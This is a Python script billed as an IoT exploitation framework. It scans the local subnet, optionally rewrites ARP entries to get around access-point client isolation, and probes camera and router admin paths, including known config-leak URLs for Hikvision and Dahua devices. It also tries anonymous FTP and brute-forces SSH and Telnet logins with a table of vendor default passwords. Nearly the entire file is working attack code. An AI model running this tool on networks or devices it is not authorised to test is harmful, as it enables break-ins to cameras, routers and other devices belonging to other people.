import nmap
import sys
import socket
import subprocess
import ipaddress
import os
import requests
import ftplib
import urllib3
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor

try:
    import paramiko
except ImportError:
    print("[!] FATAL: 'paramiko' library missing. Run: sudo apt install python3-paramiko")
    sys.exit()

# Suppress warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import logging
logging.getLogger("paramiko").setLevel(logging.CRITICAL) # Silence Paramiko's noisy logs

def print_banner():
    print("=" * 75)
    print(" IoT-Scanner - Full Exploitation Framework")
    print("=" * 75)

# --- MODULE 1: ENVIRONMENT & EVASION ---
def get_universal_network_config():
    gateway_ip = None
    subnet_cidr = None
    try:
        route_out = subprocess.check_output(['ip', 'route']).decode()
        for line in route_out.split('\n'):
            if line.startswith('default via'):
                gateway_ip = line.split()[2]
            elif 'proto kernel' in line and 'src' in line:
                subnet_cidr = line.split()[0]
        return gateway_ip, subnet_cidr
    except:
        return None, None

def inject_bypass(gateway_mac, network_hosts):
    for ip in network_hosts:
        os.system(f"arp -s {ip} {gateway_mac} > /dev/null 2>&1")

def cleanup_bypass(network_hosts):
    for ip in network_hosts:
        os.system(f"arp -d {ip} > /dev/null 2>&1")

# --- MAC & VENDOR FALLBACK MODULE ---
def get_mac_and_vendor_fallback(ip):
    """Fallback method to read the Linux ARP cache and query the vendor."""
    mac_address = "Unknown MAC"
    vendor_name = "Unknown Vendor"

    # 1. Read the raw Linux ARP table
    try:
        with open('/proc/net/arp', 'r') as f:
            for line in f.readlines():
                if ip in line:
                    parts = line.split()
                    if len(parts) >= 4:
                        mac_address = parts[3].upper()
                        break
    except Exception:
        pass

    # 2. If we found a MAC, try to resolve the Vendor
    if mac_address != "Unknown MAC":
        try:
            # Query a public MAC vendor database
            res = requests.get(f"https://api.macvendors.com/{mac_address}", timeout=2.0)
            if res.status_code == 200:
                vendor_name = res.text.strip()
        except Exception:
            # Local dictionary fallback for common IoT/Router brands if API fails
            oui = mac_address[:8].upper()
            known_ouis = {
                "00:40:66": "Hikvision", "38:AF:29": "Dahua", 
                "B8:27:EB": "Raspberry Pi", "DC:A6:32": "Raspberry Pi",
                "00:E0:4C": "Realtek (Generic IoT)", "C8:3A:35": "Tenda"
            }
            vendor_name = known_ouis.get(oui, "Unknown Vendor")

    return mac_address, vendor_name

# --- MODULE 2: DEEP DISCOVERY ---
def check_stealth_port(ip):
    ports_to_check = [21, 22, 23, 80, 443, 554, 8080]
    found_ports = []
    for port in ports_to_check:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2.0) 
                if s.connect_ex((str(ip), port)) == 0:
                    found_ports.append(port)
        except:
            pass
    if found_ports:
        return (str(ip), found_ports)
    return None

# --- MODULE 3: THE WEB EXPLOITER (CONTENT-LENGTH FILTER) ---
def exploit_web_directory(ip, port):
    print(f"\n        [*] Launching Intelligent Web Buster on {ip}:{port}...")
    
    hidden_paths = [
        '/admin', '/login', '/setup', '/config', '/system', '/dashboard', 
        '/config.json', '/config.bak', '/backup.cfg', '/env', '/.env', 
        '/ISAPI/Security/userCheck', '/System/configurationFile?auth=YWRtaW46MTEK',
        '/doc/page/login.asp', '/cgi-bin/configManager.cgi?action=getConfig',
        '/onvif/device_service', '/streaming/channels/1/picture',
        '/rom-0', '/cgi-bin/luci', '/HNAP1/', '/info.req', '/status', 
        '/api/status', '/metrics', '/fwupdate', '/ota', '/wifi'
    ]
    
    protocol = 'https' if port == 443 else 'http'
    found_count = 0
    
    fake_path = '/' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    fake_url = f"{protocol}://{ip}:{port}{fake_path}"
    
    baseline_status = 404
    baseline_length = -1
    
    try:
        res_fake = requests.get(fake_url, timeout=1.5, verify=False)
        baseline_status = res_fake.status_code
        baseline_length = len(res_fake.text)
    except:
        pass

    for path in hidden_paths:
        url = f"{protocol}://{ip}:{port}{path}"
        try:
            res = requests.get(url, timeout=1.5, verify=False)
            current_length = len(res.text)
            
            if res.status_code == baseline_status and abs(current_length - baseline_length) < 50:
                continue 
            
            if res.status_code == 200:
                print(f"            [!!!] CRITICAL: Exposed page -> {path} (200 OK | {current_length}b)")
                found_count += 1
            elif res.status_code in [401, 403]:
                print(f"            [!] Protected portal -> {path} (Requires Login | {current_length}b)")
                found_count += 1
        except:
            pass
            
    if found_count == 0:
        print("            -> No obvious hidden paths discovered.")

# --- MODULE 4: VENDOR DB & DEFAULT CREDENTIALS ---
def get_vendor_creds(vendor_name):
    iot_credentials_db = {
        "Hikvision": [("admin", "12345"), ("admin", "Admin@123"), ("admin", "admin"), ("root", "12345")],
        "Dahua": [("admin", "admin"), ("admin", "admin123"), ("888888", "888888")],
        "Cisco": [("cisco", "cisco"), ("admin", "cisco")],
        "Netgear": [("admin", "password"), ("admin", "1234")],
        "Tp-link": [("admin", "admin")],
        "Xiaomi": [("admin", "admin"), ("root", "admin")],
        "Raspberry": [("pi", "raspberry")]
    }
    
    for company, creds in iot_credentials_db.items():
        if company.lower() in vendor_name.lower():
            return company, creds
            
    # If unknown vendor, test the "Big 3" universal defaults
    return "Unknown", [("admin", "admin"), ("root", "root"), ("root", "admin")]

# --- MODULE 5: ANONYMOUS SHARE HUNTER (PORT 21) ---
def hunt_anonymous_ftp(ip):
    print(f"\n        [*] Launching Anonymous FTP Hunter on {ip}:21...")
    try:
        ftp = ftplib.FTP(ip, timeout=3)
        ftp.login('anonymous', 'anonymous@example.com')
        print("            [!!!] CRITICAL: Anonymous FTP Login Successful!")
        files = ftp.nlst()
        if files: print(f"            -> Exposed Files Found: {files[:5]}")
        ftp.quit()
    except ftplib.error_perm:
        print("            [!] FTP Login Denied (Password Required).")
    except Exception as e:
        print(f"            [-] FTP Connection Failed.")

# --- MODULE 6: SSH / TELNET SNIPER (PORTS 22, 23) ---
def exploit_auth_service(ip, port, vendor_name):
    protocol = "SSH" if port == 22 else "Telnet"
    company, cred_list = get_vendor_creds(vendor_name)
    
    print(f"\n        [*] Launching {protocol} Credential Sniper on {ip}:{port}...")
    print(f"            -> Target hardware mapped to: {company}. Testing {len(cred_list)} default payload(s)...")

    for username, password in cred_list:
        if port == 22:
            # SSH Attack using Paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(ip, port=22, username=username, password=password, timeout=3, banner_timeout=3)
                print(f"            [!!!] CRITICAL ROOT COMPROMISE: Successful SSH Login -> {username}:{password}")
                client.close()
                return # Stop guessing once we are in
            except paramiko.AuthenticationException:
                pass # Wrong password
            except Exception:
                print("            [-] SSH Service dropped connection.")
                return
            finally:
                client.close()

        elif port == 23:
            # Raw Socket Telnet Attack
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3.0)
                s.connect((ip, port))
                time.sleep(1) # Wait for banner
                s.recv(1024)  
                
                s.sendall(f"{username}\r\n".encode())
                time.sleep(1)
                s.recv(1024)
                
                s.sendall(f"{password}\r\n".encode())
                time.sleep(1)
                response = s.recv(1024).decode(errors='ignore').lower()
                
                if "incorrect" not in response and "invalid" not in response and "failed" not in response:
                    print(f"            [!!!] CRITICAL ROOT COMPROMISE: Successful Telnet Login -> {username}:{password}")
                    s.close()
                    return
                s.close()
            except Exception:
                pass

    print("            [!] Defenses held. Default credentials rejected.")

# --- MAIN ENGINE ---
def main():
    print_banner()
    
    gateway_ip, subnet_cidr = get_universal_network_config()
    if not subnet_cidr:
        print("[-] Could not determine network subnet. Exiting.")
        sys.exit()
        
    network = ipaddress.IPv4Network(subnet_cidr, strict=False)
    ips_to_check = [str(ip) for ip in network.hosts() if str(ip) != gateway_ip]
    
    print(f"[*] Subnet: {subnet_cidr} | Gateway: {gateway_ip} | Targets: {len(ips_to_check)}")
    
    print("\n[?] Engagement Mode:")
    print("    1) Standard Scan (Safe)")
    print("    2) Aggressive AP-Bypass (Requires sudo)")
    mode = input("Select Mode (1/2) > ").strip()
    
    gateway_mac = None
    if mode == '2':
        if os.geteuid() != 0:
            print("[-] AP-Bypass requires 'sudo'. Exiting.")
            sys.exit()
        nm = nmap.PortScanner()
        nm.scan(hosts=gateway_ip, arguments='-sn')
        if gateway_ip in nm.all_hosts():
            gateway_mac = nm[gateway_ip]['addresses'].get('mac', None)
        if gateway_mac:
            print("[*] Deploying Gateway Bypass...")
            inject_bypass(gateway_mac, ips_to_check)

    # DISCOVERY
    discovered_devices = {}
    print(f"\n[*] Phase 1: Commencing 1-Minute Deep Sweep...")
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        results = executor.map(check_stealth_port, ips_to_check)
        for result in results:
            if result:
                ip_addr, open_ports = result
                discovered_devices[ip_addr] = open_ports

    if not discovered_devices:
        print("[-] No active TCP ports found on any device.")
        if gateway_mac: cleanup_bypass(ips_to_check)
        return

    # TARGET MATRIX
    print(f"\n[*] Discovered {len(discovered_devices)} device(s) with open ports.\n")
    print("ID | IP Address      | Open Ports Found")
    print("-" * 50)
    
    target_menu = {}
    counter = 1
    for ip, ports in discovered_devices.items():
        port_list = ", ".join(map(str, ports))
        print(f"{counter:2} | {ip:<15} | {port_list}")
        target_menu[str(counter)] = ip
        counter += 1
    print("-" * 50)
    
    choice = input("\nEnter Target ID to Audit (or 'Q' to quit) > ").strip().upper()
    
    if choice == 'Q' or choice not in target_menu:
        if gateway_mac: cleanup_bypass(ips_to_check)
        sys.exit()
        
    target = target_menu[choice]
    target_ports = discovered_devices[target]
    port_str = ",".join(map(str, target_ports))

    # EXPLOITATION & AUDIT
    print(f"\n[*] Phase 2: Exploitation & Vulnerability Audit on {target}...")
    
    nm = nmap.PortScanner()
    print(f"    -> Running Nmap Authentication & Safe Scripts on Ports: {port_str}...")
    
    nm.scan(hosts=target, arguments=f'-Pn -sT -sV -T4 --script=safe,auth --script-timeout=2m --host-timeout=5m -p {port_str}')
    
    if target in nm.all_hosts() and 'tcp' in nm[target]:
        
        # Hardware Fingerprinting 
        mac_address = nm[target]['addresses'].get('mac', 'Unknown MAC')
        vendor_dict = nm[target].get('vendor', {})
        vendor_name = vendor_dict.get(mac_address, 'Unknown Vendor')
        
        # --- THE ARP FALLBACK INJECTION ---
        if mac_address == 'Unknown MAC' or vendor_name == 'Unknown Vendor':
            fallback_mac, fallback_vendor = get_mac_and_vendor_fallback(target)
            if mac_address == 'Unknown MAC':
                mac_address = fallback_mac
            if vendor_name == 'Unknown Vendor':
                vendor_name = fallback_vendor
        # ----------------------------------
        
        print(f"\n    [*] Hardware Fingerprint: {mac_address} ({vendor_name})")
        
        for port in nm[target]['tcp']:
            state = nm[target]['tcp'][port]['state']
            if state == 'open':
                service = nm[target]['tcp'][port].get('name', 'unknown')
                version = nm[target]['tcp'][port].get('product', '')
                
                print(f"\n    [+] Port {port}/tcp ({service}) - {version}")
                
                # Nmap NSE Output
                if 'script' in nm[target]['tcp'][port]:
                    for script_name, output in nm[target]['tcp'][port]['script'].items():
                        lines = output.splitlines()
                        # Safety check: ensure the script actually returned lines of text
                        if lines: 
                            first_line = lines[0].strip()
                            if first_line and "ERROR" not in first_line and "Couldn't find" not in first_line:
                                print(f"        -> [Nmap Script: {script_name}]: {first_line}")
                
                # The Attack Triggers
                if port == 21:
                    hunt_anonymous_ftp(target)
                    
                if port in [22, 23]:
                    exploit_auth_service(target, port, vendor_name)
                
                if port in [80, 443, 8080]:
                    exploit_web_directory(target, port)
    else:
        print("    - Scan blocked or host down.")

    if gateway_mac:
        cleanup_bypass(ips_to_check)
        
    print("\n" + "=" * 75)
    print("Audit Complete.")
    print("=" * 75)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] FATAL: IoT-Scanner must be run with 'sudo'.")
        sys.exit()
        
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] CRITICAL INTERRUPT DETECTED (Ctrl+C)!")
        print("[*] Emergency ARP Cleanup Initiated...")
        try:
            route_out = subprocess.check_output(['ip', 'route']).decode()
            for line in route_out.split('\n'):
                if 'proto kernel' in line and 'src' in line:
                    subnet = line.split()[0]
                    network = ipaddress.IPv4Network(subnet, strict=False)
                    for ip in network.hosts():
                        os.system(f"arp -d {ip} > /dev/null 2>&1")
        except:
            pass
        print("[+] Network Restored. Shutting down safely.")
        sys.exit()
